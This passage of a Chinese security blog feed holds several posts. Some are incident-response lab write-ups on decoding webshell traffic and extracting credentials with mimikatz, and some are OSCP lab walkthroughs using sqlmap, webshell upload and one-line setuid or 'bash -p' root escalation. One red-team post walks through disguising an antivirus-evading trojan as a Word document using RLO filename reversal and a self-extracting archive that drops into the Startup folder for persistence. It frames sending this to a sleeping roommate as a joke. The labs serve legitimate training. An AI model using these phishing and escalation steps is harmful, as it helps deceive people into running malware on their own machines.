src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled5.png" alt="Untitled"></p><p>追踪http流，是数据库的配置文件，搜索一下</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled6.png" alt="Untitled"></p><p>找个md5解密下</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled7.png" alt="Untitled"></p><p>flag不对，并不是真的密码</p><h3 id="3、真实的Admin密码"><a href="#3、真实的Admin密码" class="headerlink" title="3、真实的Admin密码"></a>3、真实的Admin密码</h3><p>继续查看蚁剑的响应包。在3414这个包中可以看到此时并没有Admin用户。因此推测Admin是黑客权限维持的一个用户</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled8.png" alt="Untitled"></p><p>那这有点麻烦了，如果Admin是黑客新增用户做的权限维持的话，是没有返回结果的，我们需要破解蚁剑的流量。蚁剑的流量特征还是很好鉴别的，如果不懂，还请移步到<strong>【蓝队应急】WebShell 流量特征</strong> 文章查看。</p><p>我们找没有回显或回显较少的包，对请求的蚁剑流量做解析。为了让大家动手破解，这里也不写脚本工具，仅用一些在线网站即可。</p><p>好在这个加密并不是很难，仅仅URL和base64。我们需要对蚁剑的流量掐头去尾：</p><ol><li>先URL解码一下</li><li>再以&amp;为分隔符，去掉所有的&amp;，仅仅留下来中间最大的base64编码</li><li>再进行base64解码下</li></ol><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled9.png" alt="Untitled"></p><p>再base64解码即可，这里的示例是3531号数据包，大家可以一同尝试解密下</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled10.png" alt="Untitled"></p><p>当然，更简单的方法是直接筛选蚁剑的流量包，在下面一栏看请求的数据</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled11.png" alt="Untitled"></p><p>一步步解密，最后在15190号包中找到，记得解密时把<code>il</code> 去掉</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled12.png" alt="Untitled"></p><p>找到黑客权限维持时创建的Admin 的密码是<code>Password1</code></p><h2 id="三、步骤二：LSASS-exe的程序进程ID是多少？"><a href="#三、步骤二：LSASS-exe的程序进程ID是多少？" class="headerlink" title="三、步骤二：LSASS.exe的程序进程ID是多少？"></a>三、步骤二：LSASS.exe的程序进程ID是多少？</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled13.png" alt="Untitled"></p><p>同样的，这个也需要一步步解密蚁剑的流量，在<code>5922</code>号数据包</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled14.png" alt="Untitled"></p><h2 id="四、步骤三：用户WIN101的密码是什么"><a href="#四、步骤三：用户WIN101的密码是什么" class="headerlink" title="四、步骤三：用户WIN101的密码是什么?"></a>四、步骤三：用户WIN101的密码是什么?</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled15.png" alt="Untitled"></p><h3 id="1、导出密码文件"><a href="#1、导出密码文件" class="headerlink" title="1、导出密码文件"></a>1、导出密码文件</h3><p>在步骤二中，黑客dump下来lsass进程到<code>C:\temp\OnlineShopBackup.zip</code> ，那我们需要拿到这个文件</p><p>在<code>6944</code>号数据包中，解密后是查看<code>C:\temp\OnlineShopBackup.zip</code> 的内容，那么它的相应包就是咱们需要的文件了。直接在【文件】中【到处对象】选择http，找到这个号数据包下方的47MB的数据保存</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled16.png" alt="Untitled"></p><p>导出了一个product2.php 文件，但这个数据包中还有蚁剑的数据</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled17.png" alt="Untitled"></p><p>删除开头的<code>e1c1709</code> ，修改后缀成dmp</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled18.png" alt="Untitled"></p><h3 id="2、加载密码文件"><a href="#2、加载密码文件" class="headerlink" title="2、加载密码文件"></a>2、加载密码文件</h3><p>交给mimikatz 去加载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::<span class="variable constant_">minidump</span> <span class="number">1</span>.dmp</span><br><span class="line">sekurlsa::<span class="variable constant_">logonpasswords</span></span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled19.png" alt="Untitled"></p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled20.png" alt="Untitled"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量特征 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【玄机应急】第六章特征分析—waf上截获的黑客攻击流量</title>
      <link href="/2024/06/13/xuanji-diliuzhang-waf/"/>
      <url>/2024/06/13/xuanji-diliuzhang-waf/</url>
      
        <content type="html"><![CDATA[<h1 id="【玄机应急】第六章特征分析—waf上截获的黑客攻击流量"><a href="#【玄机应急】第六章特征分析—waf上截获的黑客攻击流量" class="headerlink" title="【玄机应急】第六章特征分析—waf上截获的黑客攻击流量"></a>【玄机应急】第六章特征分析—waf上截获的黑客攻击流量</h1><h2 id="一、附件下载"><a href="#一、附件下载" class="headerlink" title="一、附件下载"></a>一、附件下载</h2><p>下载好流量数据包<code>.pcap</code>，在<code>WireShark</code>中打开</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613132832287.png" alt="image-20240613132832287"></p><h2 id="二、步骤一：黑客登陆系统的密码"><a href="#二、步骤一：黑客登陆系统的密码" class="headerlink" title="二、步骤一：黑客登陆系统的密码"></a>二、步骤一：黑客登陆系统的密码</h2><p><img src="/img/xuanji-diliuzhang-waf/image-20240613132906529.png" alt="image-20240613132906529"></p><h3 id="1、筛选POST请求"><a href="#1、筛选POST请求" class="headerlink" title="1、筛选POST请求"></a>1、筛选POST请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><p>登陆的地址在<code>/admin/login.php?rec=login</code></p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133123336.png" alt="image-20240613133123336"></p><h3 id="2、筛选全部的登陆请求"><a href="#2、筛选全部的登陆请求" class="headerlink" title="2、筛选全部的登陆请求"></a>2、筛选全部的登陆请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot; &amp;&amp; http.request.uri contains &quot;rec=login&quot;</span><br></pre></td></tr></table></figure><p>直接找最后几条</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133320489.png" alt="image-20240613133320489"></p><h2 id="三、步骤二：黑客发现的关键字符串"><a href="#三、步骤二：黑客发现的关键字符串" class="headerlink" title="三、步骤二：黑客发现的关键字符串"></a>三、步骤二：黑客发现的关键字符串</h2><p>题目中xxx的数量有32个，那么字符串也既有可能就是32位</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133436956.png" alt="image-20240613133436956"></p><h3 id="1、蚁剑流量特征"><a href="#1、蚁剑流量特征" class="headerlink" title="1、蚁剑流量特征"></a>1、蚁剑流量特征</h3><p>查看http流量的时候，发现很多对<code>a.php</code>文件发起访问</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133836165.png" alt="image-20240613133836165"></p><p>仔细查看流量发现是蚁剑的流量特征</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133746151.png" alt="image-20240613133746151"></p><h3 id="2、筛选蚁剑的响应数据包"><a href="#2、筛选蚁剑的响应数据包" class="headerlink" title="2、筛选蚁剑的响应数据包"></a>2、筛选蚁剑的响应数据包</h3><p>我们筛选所有蚁剑的请求包，之后做上标记</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri contains &quot;/a.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-waf/image-20240613145606097.png" alt="image-20240613145606097"></p><p>回到http中，看蚁剑的响应包</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150202712.png" alt="image-20240613150202712"></p><h2 id="四、步骤三：黑客找到的数据库密码"><a href="#四、步骤三：黑客找到的数据库密码" class="headerlink" title="四、步骤三：黑客找到的数据库密码"></a>四、步骤三：黑客找到的数据库密码</h2><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150423924.png" alt="image-20240613150423924"></p><p>同样是在蚁剑的响应包中找到</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150411200.png" alt="image-20240613150411200"></p>]]></content>
      
      
      <categories>
          
          <category> 玄机应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【红队入侵】文件钓鱼—RLO构造后缀</title>
      <link href="/2024/06/07/Red-Team-Invasion-RLO-file-fishing/"/>
      <url>/2024/06/07/Red-Team-Invasion-RLO-file-fishing/</url>
      
        <content type="html"><![CDATA[<h1 id="【红队入侵】文件钓鱼—RLO构造后缀"><a href="#【红队入侵】文件钓鱼—RLO构造后缀" class="headerlink" title="【红队入侵】文件钓鱼—RLO构造后缀"></a>【红队入侵】文件钓鱼—RLO构造后缀</h1><h2 id="一、前景需求"><a href="#一、前景需求" class="headerlink" title="一、前景需求"></a>一、前景需求</h2><p>当我们想发送一个木马给身边凌晨两点还在计划打团的室友，帮助他戒网瘾，早睡早起养好身体。我们需要做的准备：</p><ol><li>公网服务器</li><li>免杀的exe木马</li><li>监听的服务端</li><li>Resource Hacker</li><li>winrar 压缩包程序</li></ol><p>如下所示：<img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606205723891.png" alt="image-20240606205723891"></p><p>但是单单的exe 难免让人起疑心，搞不好会挨室友的大拳头。</p><h2 id="二、木马图标修改"><a href="#二、木马图标修改" class="headerlink" title="二、木马图标修改"></a>二、木马图标修改</h2><p>这里用<code>Resource Hacker</code>工具，给exe木马上上图标。当然，也有其他相关工具可以使用，这里只是一个示例</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210010305.png" alt="image-20240606210010305"></p><p>另外从网上找来一个类似word 的ico 图标，当然了，这个图标并不是真的，各位可以动手自己制作一个。</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210151419.png" alt="image-20240606210151419"></p><p>打开<code>Resource Hacker</code>工具，在File中加载exe木马文件，选择<code>Icon Group</code>，快捷键<code>Ctrl + R</code>打开替换图标</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210433007.png" alt="image-20240606210433007"></p><p>选中word 图标进行替换</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210937912.png" alt="image-20240606210937912"></p><p><code>ctrl + s</code> 保存就可以了，它替换之后可能还是原样，多刷新，或者尝试修改文件名。</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606211538439.png" alt="image-20240606211538439"></p><p>再尝试下是否还能连接，没有问题</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606212034856.png" alt="image-20240606212034856"></p><h2 id="三、木马后缀修改"><a href="#三、木马后缀修改" class="headerlink" title="三、木马后缀修改"></a>三、木马后缀修改</h2><p>既然要伪装成word ，我们需要把木马的名称和后缀都改了</p><p>先改名称，如<code>关于评选2024年校级优秀应届大学毕业生的通知.exe</code></p><p>再进行RLO插入，再次对文件重命名，在<code>.exe</code>的前面进行右键，选择插入<code>Unicode 控制字符串(I)</code>。这里是在虚拟机中的示范，在主机上截图不好截（注意：要先重命名，将光标放在.exe 的前面，再右键）</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606213201121.png" alt="image-20240606213201121"></p><p>进行倒叙输入<code>xcod</code>，后缀就变成了<code>docx</code>，再测试一下运行效果，是真不错</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214310982.png" alt="image-20240606214310982"></p><p>这样一个基础的word 文档钓鱼就做好了。</p><p>但是它双击之后并没有出现word文件，还是会让人起疑心。</p><h2 id="四、ZIP-自定义压缩钓鱼"><a href="#四、ZIP-自定义压缩钓鱼" class="headerlink" title="四、ZIP 自定义压缩钓鱼"></a>四、ZIP 自定义压缩钓鱼</h2><p>这里我们需要一篇真正的word 文档，如<code>关于评选2024年校级优秀应届大学毕业生的通知.dock</code>，内容可以写的接近真实一点，不让人怀疑。</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214637147.png" alt="image-20240606214637147"></p><p>对木马和word 文档进行压缩，后面的步骤按照图片一步一步来吧</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214752171.png" alt="image-20240606214752171"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214819374.png" alt="image-20240606214819374"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215019098.png" alt="image-20240606215019098"></p><p>这里的路径，可以是任意路径，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 任何人可以写入的文件路径</span><br><span class="line">C:\Windows\Temp</span><br><span class="line"></span><br><span class="line">// 具有权限维持效果的</span><br><span class="line">&quot;C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><p>这里的路径就不多说了，演示效果，我这里用<code>C:\Windows\Temp</code>。如果想用维持效果记得加双引号</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215238441.png" alt="image-20240606215238441"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240607123107078.png" alt="image-20240607123107078"></p><p>这里要把路径和文件名对应起来，如果中间有空格需要用双引号引起来</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215607379.png" alt="image-20240606215607379"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215620154.png" alt="image-20240606215620154"></p><p>就可以了，一路确定即可。</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215652648.png" alt="image-20240606215652648"></p><p>变成了<code>test.exe</code></p><p>再重复一二，修改图标和后缀。最终成品</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215957542.png" alt="image-20240606215957542"></p><p>测试效果，这里木马需不进行后缀修改，得原汁原味的exe 才行</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606220822819.png" alt="image-20240606220822819"></p><p>同时也能弹出来word<img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606220852058.png" alt="image-20240606220852058"></p><p>钓鱼嘛，讲究的是愿者上钩，如果室友这次不上当，那就等待下一个时机。当然，不止word，也可以伪装成其他的东西。</p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python武器库】取代netcat（过杀软）</title>
      <link href="/2024/05/30/Python-tools-netcat/"/>
      <url>/2024/05/30/Python-tools-netcat/</url>
      
        <content type="html"><![CDATA[<h1 id="【Python武器库】取代netcat（过杀软）"><a href="#【Python武器库】取代netcat（过杀软）" class="headerlink" title="【Python武器库】取代netcat（过杀软）"></a>【Python武器库】取代netcat（过杀软）</h1><h2 id="一、netcat-简介"><a href="#一、netcat-简介" class="headerlink" title="一、netcat 简介"></a>一、netcat 简介</h2><p>简称nc，被称为“瑞士军刀”，在网络安全中是一位不可或缺的角色。但如果拿到一太新的服务器，却没有nc，也不具备上网的能力，此时总归是让人有些抓耳的。但如果有python环境的话，却是可以替代nc。此也是一个不错的练习。</p><h2 id="二、实现效果"><a href="#二、实现效果" class="headerlink" title="二、实现效果"></a>二、实现效果</h2><h3 id="1、连接"><a href="#1、连接" class="headerlink" title="1、连接"></a>1、连接</h3><p><img src="/img/Python-tools-netcat/image-20240530182514012.png" alt="image-20240530182514012"></p><h3 id="2、命令执行"><a href="#2、命令执行" class="headerlink" title="2、命令执行"></a>2、命令执行</h3><p>1、创建文件</p><p><img src="/img/Python-tools-netcat/image-20240530182601652.png" alt="image-20240530182601652"></p><p>2、删除文件</p><p><img src="/img/Python-tools-netcat/image-20240530182729163.png" alt="image-20240530182729163"></p><h2 id="三、免杀效果"><a href="#三、免杀效果" class="headerlink" title="三、免杀效果"></a>三、免杀效果</h2><p>同样的路径，只扫描出来nc</p><p><img src="/img/Python-tools-netcat/image-20240530183318162.png" alt="image-20240530183318162"></p><h2 id="四、实战效果"><a href="#四、实战效果" class="headerlink" title="四、实战效果"></a>四、实战效果</h2><p><img src="/img/Python-tools-netcat/image-20240530185113153.png" alt="image-20240530185113153"></p><h2 id="五、代码实现"><a href="#五、代码实现" class="headerlink" title="五、代码实现"></a>五、代码实现</h2><p>由于工具危害性较大，这里只展示代码部分片段</p><p><img src="/img/Python-tools-netcat/image-20240531192217502.png" alt="image-20240531192217502"></p><p>更详细的内容，请前往Python笔记中的项目2</p><p><img src="/img/Python-tools-netcat/image-20240531192300975.png" alt="image-20240531192300975"></p>]]></content>
      
      
      <categories>
          
          <category> Python武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Katana</title>
      <link href="/2024/05/29/OSCP-Katana/"/>
      <url>/2024/05/29/OSCP-Katana/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Katana"><a href="#【OSCP系列】OSCP靶机—Katana" class="headerlink" title="【OSCP系列】OSCP靶机—Katana"></a>【OSCP系列】OSCP靶机—Katana</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Katana/image-20240529145416227.png" alt="image-20240529145416227"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529145502845.png" alt="image-20240529145502845"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Katana/image-20240529145749652.png" alt="image-20240529145749652"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p21,22,80,139,445,7080,8715,8088 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529150206333.png" alt="image-20240529150206333"></p><p><img src="/img/OSCP-Katana/image-20240529150218701.png" alt="image-20240529150218701"></p><p>21、22、80都是常见的服务，139、445是Samba服务，版本号在3.x-4.x，7080 是一个https服务，8715也是一个http服务</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p21,22,80,139,445,7080,8715,8088 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529150538337.png" alt="image-20240529150538337"></p><h2 id="三、FTP信息收集"><a href="#三、FTP信息收集" class="headerlink" title="三、FTP信息收集"></a>三、FTP信息收集</h2><p>刚才nmap 信息收集的时候，ftp并未显示未授权</p><p><img src="/img/OSCP-Katana/image-20240529153121518.png" alt="image-20240529153121518"></p><p>用hydra 进行简单的弱口令爆破，爆破失败</p><p><img src="/img/OSCP-Katana/image-20240529155142725.png" alt="image-20240529155142725"></p><h2 id="四、HTTP信息收集"><a href="#四、HTTP信息收集" class="headerlink" title="四、HTTP信息收集"></a>四、HTTP信息收集</h2><h3 id="1、80端口首页"><a href="#1、80端口首页" class="headerlink" title="1、80端口首页"></a>1、80端口首页</h3><p>是一个武士军刀</p><p><img src="/img/OSCP-Katana/image-20240529155317401.png" alt="image-20240529155317401"></p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><p>啥也没有</p><p><img src="/img/OSCP-Katana/image-20240529160141608.png" alt="image-20240529160141608"></p><p>上其他字典，扫到<code>ebook</code></p><p><img src="/img/OSCP-Katana/image-20240529160854898.png" alt="image-20240529160854898"></p><p>有其他东西了</p><p><img src="/img/OSCP-Katana/image-20240529160931617.png" alt="image-20240529160931617"></p><p>看起来像是一个CMS类型网站，继续扫</p><h3 id="3、admin-php"><a href="#3、admin-php" class="headerlink" title="3、admin.php"></a>3、admin.php</h3><p>像是后台登陆页</p><p><img src="/img/OSCP-Katana/image-20240529161453013.png" alt="image-20240529161453013"></p><h3 id="4、info-php"><a href="#4、info-php" class="headerlink" title="4、info.php"></a>4、info.php</h3><p><code>phpinfo</code>页面</p><p><img src="/img/OSCP-Katana/image-20240529161520241.png" alt="image-20240529161520241"></p><h3 id="5、SQL注入漏洞"><a href="#5、SQL注入漏洞" class="headerlink" title="5、SQL注入漏洞"></a>5、SQL注入漏洞</h3><p><img src="/img/OSCP-Katana/image-20240529162025721.png" alt="image-20240529162025721"></p><p>这里用sqlmap 跑，就不手工了</p><p><img src="/img/OSCP-Katana/image-20240529162118318.png" alt="image-20240529162118318"></p><p>结果非常妙，数据库翻找账号密码</p><p><img src="/img/OSCP-Katana/image-20240529162425561.png" alt="image-20240529162425561"></p><p>昂。。。账号密码这么草率吗？<code>admin:admin</code>登陆后台</p><p><img src="/img/OSCP-Katana/image-20240529162538091.png" alt="image-20240529162538091"></p><h3 id="6、文件上传（失败）"><a href="#6、文件上传（失败）" class="headerlink" title="6、文件上传（失败）"></a>6、文件上传（失败）</h3><p>在修改商品的地方，存在图片上传功能，这里或许存在文件上传</p><p><img src="/img/OSCP-Katana/image-20240529162758380.png" alt="image-20240529162758380"></p><p>到前台看了一下图片的路径在：<code>/ebook/bootstrap/img/mobile_app.jpg</code></p><p><img src="/img/OSCP-Katana/image-20240529162843618.png" alt="image-20240529162843618"></p><p>尝试文件上传</p><p><img src="/img/OSCP-Katana/image-20240529165506341.png" alt="image-20240529165506341"></p><p>上传失败，一度疑似条件竞争，折腾了老大会儿，均失败了</p><h3 id="7、转向8088端口"><a href="#7、转向8088端口" class="headerlink" title="7、转向8088端口"></a>7、转向8088端口</h3><p>目录扫描</p><p><img src="/img/OSCP-Katana/image-20240529165835076.png" alt="image-20240529165835076"></p><h3 id="8、文件上传"><a href="#8、文件上传" class="headerlink" title="8、文件上传"></a>8、文件上传</h3><p>不会又一个失败的吧，尝试一下</p><p><img src="/img/OSCP-Katana/image-20240529165929512.png" alt="image-20240529165929512"></p><p>有两个上传点，上传了一个正常图片和一个恶意图片</p><p><img src="/img/OSCP-Katana/image-20240529170322832.png" alt="image-20240529170322832"></p><p>上传成功了，但是移动到了其他地方，不过这个地方依然像web服务的根目录</p><p><img src="/img/OSCP-Katana/image-20240529170406689.png" alt="image-20240529170406689"></p><p>没想到在<code>8715</code>端口的根目录下发现这张图片，那这就好办了</p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>我们在8088端口上传webshell</p><p><img src="/img/OSCP-Katana/image-20240529170529155.png" alt="image-20240529170529155"></p><p>提示报错，但是文件似乎依然移动过去了，蚁剑试试</p><p><img src="/img/OSCP-Katana/image-20240529170654718.png" alt="image-20240529170654718"></p><p>连接成功，同时，我们将shell转移至nc。方法很多，这里就不展示了</p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><h3 id="1、-etc-passwd-文件"><a href="#1、-etc-passwd-文件" class="headerlink" title="1、&#x2F;etc&#x2F;passwd 文件"></a>1、&#x2F;etc&#x2F;passwd 文件</h3><p><img src="/img/OSCP-Katana/image-20240529171450269.png" alt="image-20240529171450269"></p><p>昂。？爆破了多大会，一直出不来，先找其他提权方法</p><h3 id="2、getcap查看权限"><a href="#2、getcap查看权限" class="headerlink" title="2、getcap查看权限"></a>2、getcap查看权限</h3><p><img src="/img/OSCP-Katana/image-20240529173805547.png" alt="image-20240529173805547"></p><p>有python</p><p>那直接一句话提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529173844328.png" alt="image-20240529173844328"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-InfosecPrep</title>
      <link href="/2024/05/28/OSCP-InfosecPrep/"/>
      <url>/2024/05/28/OSCP-InfosecPrep/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—InfosecPrep"><a href="#OSCP系列靶机—InfosecPrep" class="headerlink" title="OSCP系列靶机—InfosecPrep"></a>OSCP系列靶机—InfosecPrep</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-InfosecPrep/image-20240527204548647.png" alt="image-20240527204548647"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527204618888.png" alt="image-20240527204618888"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-InfosecPrep/image-20240527204858405.png" alt="image-20240527204858405"></p><h3 id="3、服务版本识别"><a href="#3、服务版本识别" class="headerlink" title="3、服务版本识别"></a>3、服务版本识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p 22,80,33060 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527204938650.png" alt="image-20240527204938650"></p><p>22端口采用<code>OpenSSH 8.1</code>版本，80端口使用<code>Apache/2.4.41</code>，发现<code>secret.txt</code> 文件，33060使用<code>mysql</code>的某个版本。</p><p>整个机器使用Ubuntu，系统版本在<code>4.15 - 5.8</code></p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80,33060 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527205325618.png" alt="image-20240527205325618"></p><p>80端口使用<code>wordpress</code>框架，发现用户名<code>admin</code>，发现一些csrf 漏洞和进行了一些目录扫描</p><h2 id="三、HTTP-信息收集"><a href="#三、HTTP-信息收集" class="headerlink" title="三、HTTP 信息收集"></a>三、HTTP 信息收集</h2><h3 id="1、首页"><a href="#1、首页" class="headerlink" title="1、首页"></a>1、首页</h3><p>一个wordpress 网站</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205611390.png" alt="image-20240527205611390"></p><h3 id="2、robots-txt-文件"><a href="#2、robots-txt-文件" class="headerlink" title="2、robots.txt 文件"></a>2、robots.txt 文件</h3><p><img src="/img/OSCP-InfosecPrep/image-20240527205658116.png" alt="image-20240527205658116"></p><h3 id="3、secret-txt-文件"><a href="#3、secret-txt-文件" class="headerlink" title="3、secret.txt 文件"></a>3、secret.txt 文件</h3><p>这个东西，有点像RSA密钥，但是好像被base64加密了</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205719333.png" alt="image-20240527205719333"></p><p>base64解密一下</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205915821.png" alt="image-20240527205915821"></p><p>这下正宗了，确认是某个用户的RSA密钥，保存起来</p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>后面收集了很多信息，均无果，重新回归HTTP ，依次查看网页上有无信息</p><p><img src="/img/OSCP-InfosecPrep/image-20240527215930920.png" alt="image-20240527215930920"></p><p>果然，在首页就已经给了用户名<code>oscp</code>了</p><p><img src="/img/OSCP-InfosecPrep/image-20240527220357448.png" alt="image-20240527220357448"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>查看SUID 文件</p><p><img src="/img/OSCP-InfosecPrep/image-20240528143312921.png" alt="image-20240528143312921"></p><p>嗯？不会吧</p><p>直接 <code>bash -p</code>提权到root</p><p><img src="/img/OSCP-InfosecPrep/image-20240528143522608.png" 